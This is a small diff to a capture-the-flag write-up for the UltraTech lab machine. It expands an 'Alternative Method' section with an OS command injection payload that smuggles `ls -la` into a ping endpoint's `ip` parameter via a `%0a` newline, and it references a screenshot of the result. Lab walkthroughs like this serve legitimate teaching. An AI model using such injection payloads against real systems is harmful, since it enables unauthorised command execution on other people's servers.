@@ -325,11 +325,15 @@ And with this we have rooted the UltraTech machine!
 
 ## Alternative Method
 
-A better way to perform OS Command Injection could be done by using the keyword `%0a`:
+A better way to perform OS Command Injection could be done by using the keyword `%0a` (newline):
 
 ```
-view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93 %0a 
+view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93 %0a ls -la
 ```
+
+Which would have resulted in an output like:
+
+![0a_command_injection](./.images/0a_command_injection.png)
 
 ## Resources
 
